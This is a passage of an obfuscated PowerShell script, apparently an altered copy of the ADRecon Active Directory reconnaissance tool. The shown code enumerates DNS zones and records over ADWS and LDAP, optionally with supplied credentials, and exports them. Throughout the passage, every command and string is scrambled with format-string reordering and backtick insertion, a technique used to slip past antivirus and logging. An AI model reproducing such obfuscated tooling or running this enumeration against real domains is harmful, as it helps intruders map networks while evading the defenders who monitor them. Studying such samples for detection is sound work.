        &("{2}{3}{1}{0}" -f 'Verbose','e-','Wri','t') "[*] Total DNS Zones: $([ADRecon.ADWSClass]::ObjectCount($DNSZoneArray)) "

        If (${D`N`szoneARRAY})
        {
            ${AdDN`sZon`esOBj} = @()
            ${A`D`Dns`NODEsobJ} = @()
            ${d`NsZOneArr`AY} | &("{2}{1}{3}{0}{4}"-f 'Objec','E','For','ach-','t') {
                
                ${O`Bj} = &("{2}{0}{1}" -f 'c','t','New-Obje') ("{0}{1}{2}"-f 'P','SO','bject')
                ${o`BJ} | &("{1}{0}{3}{2}" -f'-Me','Add','ber','m') -MemberType ("{0}{2}{1}" -f'NotePrope','ty','r') -Name ("{1}{0}"-f 'me','Na') -Value $( $9B5p6::("{0}{2}{1}"-f 'Clea','ng','nStri').Invoke(${_}."na`mE"))
                Try
                {
                    ${DNS`No`d`es} = &("{2}{1}{0}" -f 'ct','t-ADObje','Ge') -SearchBase $(${_}."D`isTiNGui`S`heDnAmE") -LDAPFilter ("{3}{5}{2}{0}{1}{4}"-f'=dnsN','od','tClass','(o','e)','bjec') -Properties ("{2}{1}{3}{0}" -f 'e','guishedNa','Distin','m'),("{1}{0}" -f 'srecord','dn'),("{3}{1}{2}{0}" -f'oned','NST','ombst','d'),("{1}{0}"-f 'me','Na'),("{2}{3}{7}{4}{6}{0}{1}{5}"-f'lDeleti','o','Protec','te','mAccide','n','nta','dFro'),("{4}{0}{3}{5}{2}{1}"-f'nAdva','wOnly','Vie','n','showI','ced'),("{1}{3}{2}{0}"-f'nged','wh','nCha','e'),("{0}{2}{3}{1}" -f 'wh','d','enCre','ate')
                }
                Catch
                {
                    &("{0}{2}{1}" -f'W','ite-Warning','r') "[Get-ADRDNSZone] Error while enumerating $($_.DistinguishedName) dnsNode Objects "
                    &("{0}{1}{2}{3}{4}"-f'W','rit','e','-Ver','bose') "[EXCEPTION] $($_.Exception.Message) "
                }
                If (${dnsN`OD`es})
                {
                    ${O`Bj} | &("{1}{0}{2}" -f 'mbe','Add-Me','r') -MemberType ("{1}{2}{0}" -f'perty','NoteP','ro') -Name ("{2}{1}{0}"-f 'ount','cordC','Re') -Value $(${D`NsNo`dES} | &("{0}{3}{1}{2}" -f'Measu','c','t','re-Obje') | &("{3}{1}{0}{2}"-f'b','-O','ject','Select') -ExpandProperty ("{1}{0}"-f't','Coun'))
                    ${DnSNO`d`es} | &("{3}{0}{2}{1}{4}"-f 'orEa','Obj','ch-','F','ect') {
                        ${o`BJNOdE} = &("{1}{0}{2}"-f 'w-','Ne','Object') ("{1}{0}{2}"-f 'Objec','PS','t')
                        ${ObJ`NoDe} | &("{1}{2}{0}"-f'r','Add-','Membe') -MemberType ("{0}{2}{1}{3}"-f'NotePro','er','p','ty') -Name ("{2}{1}{0}" -f 'e','oneNam','Z') -Value ${o`BJ}."n`AME"
                        ${o`BJ`NodE} | &("{1}{0}{2}" -f'dd','A','-Member') -MemberType ("{2}{1}{0}{3}"-f'Prop','ote','N','erty') -Name ("{1}{0}" -f 'ame','N') -Value ${_}."N`Ame"
                        Try
                        {
                            ${dn`sR`ecorD} = &("{0}{2}{4}{3}{1}"-f 'Co','ord','nvert-','Rec','DNS') ${_}."DNsrE`C`ord"[0]
                        }
                        Catch
                        {
                            &("{0}{1}{2}" -f 'Wr','ite-W','arning') ("{10}{7}{4}{8}{9}{0}{3}{5}{6}{1}{2}"-f 'e','ec','ord',' conv','r wh','erting the',' DNSR','Erro','i','l','[Get-ADRDNSZone] ')
                            &("{0}{3}{2}{1}" -f'Write','se','o','-Verb') "[EXCEPTION] $($_.Exception.Message) "
                        }
                        ${ObjNo`dE} | &("{2}{3}{0}{1}" -f 'd','-Member','A','d') -MemberType ("{0}{1}{2}"-f'No','tePr','operty') -Name ("{0}{2}{1}" -f'Re','ype','cordT') -Value ${dnS`REC`ORd}."R`E`CorDtype"
                        ${OBJn`o`de} | &("{1}{0}{2}"-f 'Membe','Add-','r') -MemberType ("{3}{0}{1}{2}" -f 'e','P','roperty','Not') -Name ("{1}{0}"-f 'ata','D') -Value ${dn`SREc`o`Rd}."D`ATa"
                        ${o`Bjno`DE} | &("{3}{1}{0}{2}"-f'Mem','d-','ber','Ad') -MemberType ("{0}{3}{1}{2}" -f 'Note','per','ty','Pro') -Name ("{1}{0}" -f'L','TT') -Value ${D`NsrE`co`Rd}."T`TL"
                        ${o`BJN`odE} | &("{0}{2}{1}" -f'Add','ber','-Mem') -MemberType ("{0}{2}{3}{1}" -f'N','ty','ote','Proper') -Name ("{0}{1}"-f 'A','ge') -Value ${DnS`Re`CORd}."a`GE"
                        ${O`BjNO`De} | &("{0}{2}{1}"-f'Add','ber','-Mem') -MemberType ("{2}{0}{1}{3}"-f 'ote','Propert','N','y') -Name ("{2}{3}{1}{0}"-f'p','Stam','Tim','e') -Value ${D`NSr`Ecord}."Tim`EST`AmP"
                        ${o`BjNo`De} | &("{1}{0}{2}" -f'M','Add-','ember') -MemberType ("{2}{3}{0}{1}"-f'r','ty','Not','ePrope') -Name ("{3}{0}{2}{4}{1}"-f 'ted','al','AtS','Upda','eri') -Value ${dn`sRE`CORD}."u`pd`ATe`dATSER`Ial"
                        ${o`B`jNODE} | &("{0}{2}{1}" -f'A','ber','dd-Mem') -MemberType ("{2}{1}{0}"-f'y','tePropert','No') -Name ("{2}{0}{1}" -f 'e','d','whenCreat') -Value ${_}."WHe`Nc`ReAt`eD"
                        ${OB`JN`ODE} | &("{3}{1}{0}{2}" -f 'e','mb','r','Add-Me') -MemberType ("{0}{1}{2}{3}" -f 'N','ote','Prop','erty') -Name ("{2}{0}{1}"-f'ge','d','whenChan') -Value ${_}."w`HEncHaN`gEd"
                        
                        
                        
                        ${oBJN`o`DE} | &("{2}{0}{1}" -f 'e','r','Add-Memb') -MemberType ("{0}{2}{1}" -f'NotePrope','ty','r') -Name ("{3}{2}{1}{0}{4}"-f'O','cedView','nAdvan','showI','nly') -Value ${_}."sHO`w`in`AdvAnc`edVIEwONly"
                        ${OB`JNOdE} | &("{2}{1}{0}"-f'ber','dd-Mem','A') -MemberType ("{3}{0}{1}{2}" -f 'r','t','y','NotePrope') -Name ("{1}{3}{0}{2}" -f'guis','Di','hedName','stin') -Value ${_}."DiS`TiN`guISh`ed`NAMe"
                        ${aDD`N`sNoDesOBj} += ${o`BJNOdE}
                        If (${dnsR`eCO`RD})
                        {
                            &("{1}{0}{3}{2}" -f'em','R','-Variable','ove') ("{0}{1}{2}"-f 'DNS','Recor','d')
                        }
                    }
                }
                Else
                {
                    ${O`Bj} | &("{1}{0}{2}"-f'dd-Mem','A','ber') -MemberType ("{2}{1}{0}" -f'erty','teProp','No') -Name ("{0}{2}{3}{1}" -f 'Reco','t','rdC','oun') -Value ${n`ULL}
                }
                ${o`Bj} | &("{1}{0}{2}" -f 'embe','Add-M','r') -MemberType ("{3}{1}{2}{0}" -f'ty','o','per','NotePr') -Name ("{0}{1}{2}" -f 'USNC','re','ated') -Value ${_}."U`sNcr`eA`TeD"
                ${O`Bj} | &("{0}{2}{1}" -f'Add','ember','-M') -MemberType ("{1}{3}{2}{0}"-f 'ty','NoteP','r','rope') -Name ("{0}{2}{1}" -f'U','anged','SNCh') -Value ${_}."US`NC`HaNgeD"
                ${o`Bj} | &("{2}{0}{1}"-f 'dd','-Member','A') -MemberType ("{1}{3}{2}{0}"-f 'roperty','N','eP','ot') -Name ("{2}{0}{1}"-f'eate','d','whenCr') -Value ${_}."wHen`CR`eateD"
                ${o`BJ} | &("{2}{1}{3}{0}" -f'er','M','Add-','emb') -MemberType ("{3}{1}{2}{0}" -f'operty','P','r','Note') -Name ("{1}{0}{2}"-f'enCh','wh','anged') -Value ${_}."WhE`N`chA`NGEd"
                ${o`Bj} | &("{1}{0}{3}{2}" -f'm','Add-Me','er','b') -MemberType ("{0}{1}{2}{3}"-f 'NotePr','op','er','ty') -Name ("{2}{4}{5}{0}{1}{3}" -f'ngu','ishedNam','D','e','is','ti') -Value ${_}."DIst`IN`GuiS`hedN`AME"
                ${ADdn`sZON`e`SoBj} += ${O`Bj}
            }
            &("{2}{1}{0}" -f'ose','Verb','Write-') "[*] Total DNS Records: $([ADRecon.ADWSClass]::ObjectCount($ADDNSNodesObj)) "
            &("{0}{1}{2}"-f 'Re','move-Variabl','e') ("{1}{2}{0}" -f'ray','DNSZone','Ar')
        }
    }

    If (${M`Et`hod} -eq ("{0}{1}" -f 'L','DAP'))
    {
        ${o`BjSE`ArCHeR} = &("{2}{1}{0}" -f 'ct','w-Obje','Ne') ("{9}{6}{2}{8}{5}{1}{4}{0}{3}{7}" -f'rch','s.DirectorySe','or','e','a','ce','.Direct','r','yServi','System') ${Ob`jD`OMAiN}
        ${o`BJ`sEAR`cher}."PA`ges`izE" = ${PaGeS`I`ZE}
        ${obJS`EA`RchEr}."PR`OpE`RT`iESt`OLOad".("{2}{0}{1}" -f'a','nge','AddR').Invoke((("{1}{0}" -f 'ame','n'),("{2}{3}{1}{0}"-f 'ed','at','w','hencre'),("{1}{2}{0}{3}" -f'an','wh','ench','ged'),("{1}{3}{2}{0}"-f'd','u','ncreate','s'),("{0}{1}{2}" -f 'u','sncha','nged'),("{5}{3}{0}{1}{4}{2}"-f 't','i','shedname','s','ngui','di')))
        ${ObjS`EA`Rcher}."Fi`lt`er" = (("{4}{2}{1}{0}{3}"-f 's=dnsZ','ectClas','obj','one)','('))
        ${o`BjSEaRcH`eR}."sEARc`hScO`pe" = ("{1}{0}" -f'tree','Sub')

        Try
        {
            ${AD`dn`S`ZoNeS} = ${oBj`Se`ArCH`er}.("{2}{1}{0}"-f'ndAll','i','F').Invoke()
        }
        Catch
        {
            &("{3}{0}{2}{1}" -f'te','arning','-W','Wri') ("{9}{7}{4}{5}{3}{0}{2}{1}{6}{8}{10}" -f 'ror','ating dnsZone Obj',' while enumer','Er','A','DRDNSZone] ','e','et-','c','[G','ts')
            &("{1}{2}{0}" -f'e-Verbose','Wri','t') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${O`BJsearC`h`eR}.("{1}{0}"-f 'se','dispo').Invoke()

        ${Dns`Zonea`RR`Ay} = @()
        If (${A`dDNs`zOnes})
        {
            ${dN`Sz`ONeaRRAy} += ${aDD`NSz`OneS}
            &("{3}{4}{0}{1}{2}"-f 'e','-Variabl','e','Rem','ov') ("{0}{1}{2}" -f 'ADDNSZ','one','s')
        }

        ${S`eA`RcHP`Ath} = ("{2}{0}{4}{1}{3}" -f'a','n','DC=Dom','es','inDnsZo')
        If (${CREdent`i`AL} -ne  (Get-VARIable  ("cLf"+"0n")).ValuE::"eM`pTy")
        {
            ${obJs`ea`RchP`A`Th} = &("{3}{0}{1}{2}" -f '-Obje','c','t','New') ("{6}{4}{0}{3}{5}{2}{1}{7}" -f 'y','tor','ec','Services.D','stem.Director','ir','Sy','yEntry') "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", ${CrED`en`T`ial}."UsErn`A`me",${cr`EDE`Ntial}.("{1}{2}{5}{3}{0}{4}" -f'kCredentia','G','et','r','l','Netwo').Invoke()."P`ASsw`oRd"
        }
        Else
        {
            ${OBjSEa`R`chPAth} = &("{1}{0}{3}{2}"-f '-O','New','t','bjec') ("{7}{5}{0}{4}{1}{2}{6}{3}" -f 'm.','toryS','ervices.Di','ectoryEntry','Direc','e','r','Syst') "LDAP://$($SearchPath),$($objDomain.distinguishedName)"
        }
        ${oBjsEAr`c`HeR`pATH} = &("{0}{2}{1}" -f 'New-O','ct','bje') ("{2}{5}{3}{1}{10}{8}{6}{4}{9}{7}{0}"-f'her','ryService','S','recto','ySe','ystem.Di','ctor','c','ire','ar','s.D') ${ObJse`ARC`hPA`TH}
        ${oB`jseArCH`ERpA`TH}."FiLT`ER" = ("{1}{5}{3}{0}{4}{2}" -f 'sZon','(obje',')','n','e','ctClass=d')
        ${o`BjS`eARCH`eRP`AtH}."pAGe`Size" = ${p`AgeSIZe}
        ${objsearcH`e`RPa`TH}."PrOP`er`TIesT`OLoAD".("{1}{0}{2}" -f'ddR','A','ange').Invoke((("{0}{1}" -f 'n','ame'),("{0}{2}{1}{3}"-f'whenc','e','reat','d'),("{2}{0}{1}{3}"-f'ha','nge','whenc','d'),("{1}{2}{0}" -f'eated','u','sncr'),("{0}{3}{1}{2}" -f 'usn','ha','nged','c'),("{2}{1}{4}{0}{3}{5}" -f 'sh','s','di','ed','tingui','name')))
        ${OBJseARchE`Rp`ATH}."sEA`RcH`s`cope" = ("{0}{1}" -f'Subt','ree')

        Try
        {
            ${aDDN`S`ZON`eS1} = ${O`BJ`sE`ArChErp`Ath}.("{2}{0}{1}" -f'n','dAll','Fi').Invoke()
        }
        Catch
        {
            &("{2}{3}{1}{0}"-f'ning','ar','Writ','e-W') "[Get-ADRDNSZone] Error while enumerating $($SearchPath),$($objDomain.distinguishedName) dnsZone Objects. "
            &("{0}{1}{3}{2}" -f'Writ','e-V','se','erbo') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${OBJ`S`Earch`ERp`ATH}.("{2}{1}{0}" -f'se','spo','di').Invoke()

        If (${AdDNsZ`oN`ES1})
        {
            ${d`NS`ZoneAr`Ray} += ${ADdn`Szon`E`S1}
            &("{3}{0}{2}{4}{1}"-f 'e','e','move-Va','R','riabl') ("{2}{1}{0}"-f'1','DNSZones','AD')
        }

        ${SEARcH`pA`TH} = ("{1}{0}{4}{2}{3}" -f 'C=For','D','tDnsZone','s','es')
        If (${c`ReDENT`i`AL} -ne   $ClF0n::"EM`Pty")
        {
            ${do`mAIn`FqdN} = &("{1}{0}{2}"-f't-DNt','Ge','oFQDN')(${ObJD`OM`AiN}."diStIN`g`U`ishEdN`AmE")
            ${DoMainCon`T`ext} = &("{3}{0}{2}{1}" -f'ew-Obj','ct','e','N') ("{0}{10}{4}{5}{6}{11}{9}{8}{7}{1}{2}{3}" -f 'System.Di','c','toryContex','t','ervic','es','.ActiveD','y.Dire','ector','r','rectoryS','i')(("{0}{1}"-f 'Dom','ain'),$(${D`OmAI`NFqDn}),$(${CrEDENt`i`AL}."US`Er`NAme"),$(${Cr`edEntI`AL}.("{0}{5}{1}{4}{2}{3}" -f 'Ge','e','orkC','redential','tw','tN').Invoke()."p`ASSW`oRd"))
            Try
            {
                ${aDDoma`In} =  (dir ("VAriA"+"bL"+"E:UX5M")  ).vAlUe::("{0}{2}{3}{1}" -f'Ge','n','t','Domai').Invoke(${dOma`InCo`NText})
            }
            Catch
            {
                &("{0}{3}{1}{2}" -f'Wri','War','ning','te-') ("{9}{12}{10}{4}{13}{8}{1}{6}{2}{7}{0}{11}{5}{3}" -f'ng ','r','t','xt','-ADRForest','onte','or get','i',' Er','[','t','Domain C','Ge',']')
                &("{3}{1}{4}{0}{2}" -f'Ve','rite','rbose','W','-') "[EXCEPTION] $($_.Exception.Message) "
                Return ${N`UlL}
            }
            &("{1}{3}{2}{0}"-f'able','Remove','Vari','-') ("{1}{3}{2}{0}" -f 'xt','DomainC','nte','o')
            ${OBjseA`R`ChPa`TH} = &("{2}{0}{1}" -f 'w-','Object','Ne') ("{3}{2}{4}{5}{6}{7}{0}{1}" -f 'o','ryEntry','stem.D','Sy','i','rect','oryServices.Di','rect') "LDAP://$($DomainController)/$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')", ${C`REdeN`T`IAl}."uS`er`NaME",${CrEdE`Nt`I`Al}.("{2}{4}{1}{3}{0}{5}"-f 'entia','tworkC','Get','red','Ne','l').Invoke()."pAS`sW`orD"
        }
        Else
        {
            ${AD`dO`MAIn} =   ( GEt-VaRiAblE  ux5m ).VaLUE::("{3}{1}{2}{0}{4}"-f'a','etCu','rrentDom','G','in').Invoke()
            ${O`BjseArCH`P`ATh} = &("{1}{2}{0}" -f'ject','New','-Ob') ("{5}{6}{2}{1}{3}{0}{4}" -f'toryE','.D','ryServices','irec','ntry','System.Dir','ecto') "LDAP://$($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=')"
        }

        ${OBJs`Ear`ch`eRP`ATh} = &("{0}{1}{2}" -f'Ne','w-Ob','ject') ("{4}{9}{0}{1}{6}{3}{8}{10}{5}{2}{7}"-f 'ec','toryServ','he','.Di','System.D','arc','ices','r','rectory','ir','Se') ${o`Bjse`A`RChPA`Th}
        ${ob`jsEAR`ChE`RPa`Th}."fiL`TeR" = ("{1}{0}{5}{2}{4}{3}{6}" -f'objectCla','(','dn','o','sZ','ss=','ne)')
        ${Obj`S`eArCHErp`ATH}."P`A`GEsIZE" = ${pAG`es`IZe}
        ${Ob`JsE`AR`cheRPaTH}."P`RoPer`TI`Es`ToLOAD".("{0}{2}{1}" -f'AddRa','ge','n').Invoke((("{0}{1}" -f'n','ame'),("{1}{0}{2}" -f'rea','whenc','ted'),("{2}{0}{1}" -f 'e','d','whenchang'),("{2}{1}{0}"-f'ed','at','usncre'),("{1}{0}{2}" -f 'n','us','changed'),("{3}{1}{0}{2}"-f'guishe','in','dname','dist')))
        ${ObjseA`RCh`eRPaTH}."SeAr`cH`s`copE" = ("{2}{1}{0}" -f'ee','r','Subt')

        Try
        {
            ${AdDNS`z`onE`S2} = ${oBjS`Ea`Rc`HerP`ATH}.("{2}{0}{1}"-f'ind','All','F').Invoke()
        }
        Catch
        {
            &("{2}{0}{1}{3}" -f'a','rni','Write-W','ng') "[Get-ADRDNSZone] Error while enumerating $($SearchPath),DC=$($ADDomain.Forest.Name -replace '\.',',DC=') dnsZone Objects."
            &("{2}{1}{3}{0}" -f'bose','rite-Ve','W','r') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${oB`JSEAr`ChE`R`PAth}.("{1}{0}{2}"-f'pos','dis','e').Invoke()

        If (${ad`Dns`z`oNEs2})
        {
            ${dNszoN`eAr`R`AY} += ${add`N`szON`es2}
            &("{3}{2}{1}{0}"-f'le','riab','Va','Remove-') ("{0}{2}{1}"-f 'A','DNSZones2','D')
        }

        If(${ADdoM`A`iN})
        {
            &("{2}{0}{1}{3}"-f'e','move-Varia','R','ble') ("{2}{0}{1}"-f'DDo','main','A')
        }

        &("{3}{0}{1}{2}"-f 'ite-Ver','b','ose','Wr') "[*] Total DNS Zones: $([ADRecon.LDAPClass]::ObjectCount($DNSZoneArray)) "

        If (${D`NsZo`NeARRaY})
        {
            ${add`NS`Z`oneSo`Bj} = @()
            ${ADd`NsNO`d`Es`obJ} = @()
            ${dnsZO`NE`A`RrAy} | &("{2}{0}{1}"-f 'E','ach-Object','For') {
                If (${c`Rede`NTI`Al} -ne  $cLf0n::"eM`PTy")
                {
                    ${objS`e`Ar`Chpath} = &("{2}{0}{1}" -f 'bjec','t','New-O') ("{0}{6}{8}{3}{1}{2}{5}{9}{4}{7}"-f 'System','e','rvi','S','oryEn','ce','.D','try','irectory','s.Direct') "LDAP://$($DomainController)/$($_.Properties.distinguishedname)", ${CReden`T`i`Al}."USE`R`Name",${cre`denT`ial}.("{2}{1}{0}{4}{3}"-f'tworkCreden','e','GetN','l','tia').Invoke()."pAsS`wo`Rd"
                }
                Else
                {
                    ${OB`jse`A`RCH`PAth} = &("{1}{2}{0}"-f'ject','Ne','w-Ob') ("{6}{3}{2}{5}{1}{7}{0}{8}{4}" -f'rvices.Di','yS','r','em.Di','ntry','ector','Syst','e','rectoryE') "LDAP://$($_.Properties.distinguishedname)"
                }
                ${obj`sEarC`hERP`Ath} = &("{0}{2}{3}{1}" -f 'N','ject','ew-','Ob') ("{0}{6}{7}{3}{4}{11}{8}{5}{12}{2}{10}{9}{1}" -f 'System.D','earcher','Dire','ect','o','e','i','r','c','yS','ctor','ryServi','s.') ${oBJ`S`e`ARChPATH}
                ${oBjSE`Ar`CHer`P`ATh}."Fi`LtEr" = ("{0}{3}{2}{1}{4}" -f '(obj','s','lass=dn','ectC','Node)')
                ${O`B`JseaRCH`ER`PATH}."P`AGE`sIze" = ${p`A`GeSiZE}
                ${ObjSea`RCh`e`RpAth}."pRo`PertI`es`TOl`oAd".("{1}{2}{0}"-f 'Range','Ad','d').Invoke((("{2}{0}{1}{3}" -f 'isti','nguishedna','d','me'),("{3}{0}{2}{1}" -f 're','ord','c','dns'),("{1}{0}" -f'me','na'),"dc",("{3}{4}{1}{0}{2}" -f'n','dva','cedviewonly','sh','owina'),("{0}{2}{1}"-f'whe','changed','n'),("{0}{1}{2}"-f 'wh','encrea','ted')))
                Try
                {
                    ${dnsnoD`ES} = ${OBj`seARCHer`Pa`Th}.("{0}{1}{2}" -f 'Fi','ndA','ll').Invoke()
                }
                Catch
                {
                    &("{1}{3}{2}{0}" -f'ning','W','ite-War','r') "[Get-ADRDNSZone] Error while enumerating $($_.Properties.distinguishedname) dnsNode Objects "
                    &("{0}{3}{1}{2}"-f 'Write-V','rbos','e','e') "[EXCEPTION] $($_.Exception.Message) "
                }
                ${objsE`ArCh`Er`path}.("{0}{1}"-f 'd','ispose').Invoke()
                &("{1}{0}{2}"-f'emove-Variabl','R','e') ("{0}{1}{2}{3}" -f 'o','bjS','e','archPath')

                
                ${O`BJ} = &("{1}{0}{2}"-f 'w-O','Ne','bject') ("{2}{1}{0}" -f 'ject','b','PSO')
                ${o`BJ} | &("{1}{2}{0}"-f 'er','Add-Mem','b') -MemberType ("{1}{0}{3}{2}" -f 'ro','NoteP','erty','p') -Name ("{0}{1}" -f 'Na','me') -Value $( (Gi  vaRiable:olXe).VaLuE::"C`leAnStrI`Ng"(${_}."p`R`OpERtieS"."NA`mE"[0]))
                If (${dnsn`o`dES})
                {
                    ${o`BJ} | &("{1}{0}{2}"-f'-M','Add','ember') -MemberType ("{3}{0}{2}{1}"-f'e','ty','r','NoteProp') -Name ("{2}{1}{0}" -f'unt','ecordCo','R') -Value $(${Dn`s`N`ODES} | &("{1}{0}{2}{3}"-f'easure-O','M','b','ject') | &("{1}{3}{2}{0}"-f 'ect','Selec','-Obj','t') -ExpandProperty ("{1}{0}"-f 'unt','Co'))
                    ${D`NsNo`Des} | &("{3}{1}{2}{4}{0}" -f 'ect','orE','ach-','F','Obj') {
                        ${O`B`jNodE} = &("{2}{0}{1}{3}" -f 'w','-','Ne','Object') ("{0}{1}{2}"-f 'PS','O','bject')
                        ${o`BJNO`DE} | &("{0}{2}{1}"-f'Add-Mem','r','be') -MemberType ("{1}{0}{2}" -f'o','NotePr','perty') -Name ("{1}{2}{0}" -f'neName','Z','o') -Value ${o`BJ}."N`Ame"
                        ${N`Ame} = ([string] $(${_}."Pr`o`pERT`ies"."n`AME"))
                        If (-Not ${nA`me})
                        {
                            ${Na`ME} = ([string] $(${_}."PR`OPErt`IeS"."Dc"))
                        }
                        ${O`B`jnode} | &("{0}{1}{2}" -f 'Add-M','em','ber') -MemberType ("{3}{2}{1}{0}"-f'y','rt','rope','NoteP') -Name ("{0}{1}" -f'N','ame') -Value ${NA`ME}
                        Try
                        {
                            ${d`NsreCO`Rd} = &("{2}{3}{1}{0}{4}" -f 'e','R','Conve','rt-DNS','cord') ${_}."propE`RT`i`Es"."dnsrE`CO`Rd"[0]
                        }
                        Catch
                        {
                            &("{2}{0}{1}"-f'it','e-Warning','Wr') ("{12}{1}{11}{9}{2}{4}{0}{10}{13}{7}{5}{6}{8}{3}" -f'ile','-ADR','Error','rd',' wh','ng',' the DNSRe','verti','co','e] ',' ','DNSZon','[Get','con')
                            &("{0}{2}{1}{3}"-f'W','te-Verbo','ri','se') "[EXCEPTION] $($_.Exception.Message) "
                        }
                        ${O`BJnO`DE} | &("{0}{1}{2}"-f'Add','-M','ember') -MemberType ("{3}{2}{1}{0}"-f 'erty','p','tePro','No') -Name ("{1}{2}{0}" -f 'rdType','Rec','o') -Value ${dNsR`e`cORd}."re`cORdt`yPe"
                        ${Ob`jnO`de} | &("{0}{1}{2}" -f 'Ad','d-Mem','ber') -MemberType ("{0}{1}{3}{2}" -f 'NotePro','p','rty','e') -Name ("{1}{0}" -f 'ta','Da') -Value ${DNSRe`CO`Rd}."d`AtA"
                        ${o`BJ`NoDe} | &("{2}{1}{0}"-f'r','embe','Add-M') -MemberType ("{2}{1}{0}"-f 'erty','oteProp','N') -Name ("{0}{1}" -f'T','TL') -Value ${DnS`REc`ord}."T`TL"
                        ${o`Bjn`ODe} | &("{2}{1}{3}{0}"-f'ber','dd-','A','Mem') -MemberType ("{1}{2}{0}" -f 'roperty','Note','P') -Name ("{0}{1}" -f 'A','ge') -Value ${Dn`S`Rec`ord}."A`Ge"
                        ${oBjN`ODE} | &("{2}{0}{3}{1}"-f'd-Me','ber','Ad','m') -MemberType ("{0}{3}{1}{2}" -f'Note','rope','rty','P') -Name ("{1}{0}{2}"-f'm','TimeSta','p') -Value ${d`Ns`RECord}."tIMeS`T`Amp"
                        ${O`BJ`NodE} | &("{2}{0}{1}"-f'-Me','mber','Add') -MemberType ("{2}{0}{1}{3}"-f'otePro','pert','N','y') -Name ("{0}{1}{2}"-f'Up','date','dAtSerial') -Value ${dnsr`Ec`orD}."uPdaT`e`DATS`ERIaL"
                        ${OB`jnO`De} | &("{2}{0}{1}" -f 'b','er','Add-Mem') -MemberType ("{1}{3}{2}{0}" -f'ty','Not','Proper','e') -Name ("{0}{1}{2}" -f'w','henCre','ated') -Value ([DateTime] $(${_}."PRO`p`ertiES"."w`Hen`cr`EATEd"))
                        ${ObJn`o`DE} | &("{0}{1}{2}" -f'Add','-Me','mber') -MemberType ("{0}{1}{2}"-f'NotePro','per','ty') -Name ("{1}{3}{2}{0}"-f'ed','w','hang','henC') -Value ([DateTime] $(${_}."p`ROpeRtI`es"."WH`E`NCh`ANGEd"))
                        
                        
                        
                        ${oBj`NO`dE} | &("{2}{0}{1}{3}"-f 'Me','mbe','Add-','r') -MemberType ("{0}{2}{1}"-f 'N','teProperty','o') -Name ("{2}{1}{0}{3}" -f'e','ancedVi','showInAdv','wOnly') -Value ([string] $(${_}."prOP`eRt`iEs"."SH`OwINadv`A`Nced`V`iEwONLy"))
                        ${ObJnO`De} | &("{1}{0}{2}"-f'dd-','A','Member') -MemberType ("{2}{1}{0}"-f 'rty','rope','NoteP') -Name ("{2}{1}{3}{0}"-f'Name','ui','Disting','shed') -Value ([string] $(${_}."p`RoPeRtI`eS"."d`I`stingu`Ishe`DnAMe"))
                        ${AD`dN`SnoDEs`OBJ} += ${OB`J`NodE}
                        If (${d`NSRec`Ord})
                        {
                            &("{1}{0}{3}{2}{4}" -f'v','Remo','V','e-','ariable') ("{2}{0}{1}" -f 'r','d','DNSReco')
                        }
                    }
                }
                Else
                {
                    ${o`BJ} | &("{1}{2}{0}"-f 'Member','Ad','d-') -MemberType ("{0}{1}{2}"-f 'NoteP','rope','rty') -Name ("{2}{3}{1}{0}"-f'dCount','r','Rec','o') -Value ${N`ULL}
                }
                ${o`Bj} | &("{2}{0}{1}" -f 'd-Me','mber','Ad') -MemberType ("{0}{3}{1}{2}" -f 'Note','opert','y','Pr') -Name ("{1}{0}{2}" -f'Cr','USN','eated') -Value ([string] $(${_}."ProP`E`R`TIeS"."U`sNCRE`ATeD"))
                ${o`BJ} | &("{0}{3}{2}{1}"-f'Add','ber','m','-Me') -MemberType ("{2}{1}{0}" -f 'perty','o','NotePr') -Name ("{2}{0}{1}"-f'han','ged','USNC') -Value ([string] $(${_}."P`ROPe`RtieS"."USNch`Ang`Ed"))
                ${o`BJ} | &("{2}{0}{3}{1}"-f'dd','r','A','-Membe') -MemberType ("{2}{0}{1}"-f 'Prope','rty','Note') -Name ("{2}{0}{1}" -f'reate','d','whenC') -Value ([DateTime] $(${_}."PRop`ERtI`ES"."WH`EncRe`A`Ted"))
                ${O`Bj} | &("{1}{2}{0}{3}" -f'Mem','Ad','d-','ber') -MemberType ("{0}{2}{1}"-f 'No','rty','tePrope') -Name ("{1}{0}{3}{2}" -f'he','w','ed','nChang') -Value ([DateTime] $(${_}."PRope`RT`IES"."w`HEN`ChA`NGED"))
                ${O`Bj} | &("{0}{2}{1}" -f 'Add-Mem','r','be') -MemberType ("{1}{2}{0}" -f'rty','NoteP','rope') -Name ("{4}{0}{3}{2}{1}"-f'uis','me','edNa','h','Disting') -Value ([string] $(${_}."PrOp`ErT`iEs"."diSt`InguI`ShED`NAMe"))
                ${a`DDNSz`OnEs`ObJ} += ${o`Bj}
            }
            &("{1}{2}{0}"-f'Verbose','W','rite-') "[*] Total DNS Records: $([ADRecon.LDAPClass]::ObjectCount($ADDNSNodesObj)) "
            &("{2}{3}{1}{0}"-f'ble','Varia','R','emove-') ("{0}{1}{2}"-f 'D','NSZoneA','rray')
        }
    }

    If (${A`DdNSZon`EsoBJ} -and ${adRDns`Z`onES})
    {
        &("{0}{2}{1}"-f'Ex','R','port-AD') ${a`DdnS`ZO`NesObJ} ${A`D`RoUtpUt`dir} ${o`U`TpuT`TyPE} ("{0}{2}{1}" -f'DNSZon','s','e')
        &("{0}{3}{1}{4}{2}" -f 'Rem','ar','e','ove-V','iabl') ("{2}{1}{0}"-f 'NSZonesObj','D','AD')
    }

    If (${ADdnsnODe`so`BJ} -and ${ADr`dnSR`ECOR`dS})
    {
        &("{2}{0}{1}" -f 'AD','R','Export-') ${AD`Dns`No`d`eSobJ} ${aD`RoU`TpU`TDir} ${O`UTPUtt`Y`Pe} ("{0}{1}" -f'DNSNod','es')
        &("{3}{1}{0}{2}"-f 've-V','emo','ariable','R') ("{0}{1}{2}"-f 'AD','D','NSNodesObj')
    }
}

Function GeT`-`AdRP`RIN`TEr
{


    param(
        [Parameter(mANDaTorY = ${t`RUe})]
        [string] ${M`E`Thod},

        [Parameter(MANdAtory = ${faL`sE})]
        [DirectoryServices.DirectoryEntry] ${oB`JdoM`AiN},

        [Parameter(MaNdatORy = ${tr`UE})]
        [int] ${pAGE`s`izE} = 200,

        [Parameter(ManDATOry = ${FA`Lse})]
        [int] ${THRE`A`Ds} = 10
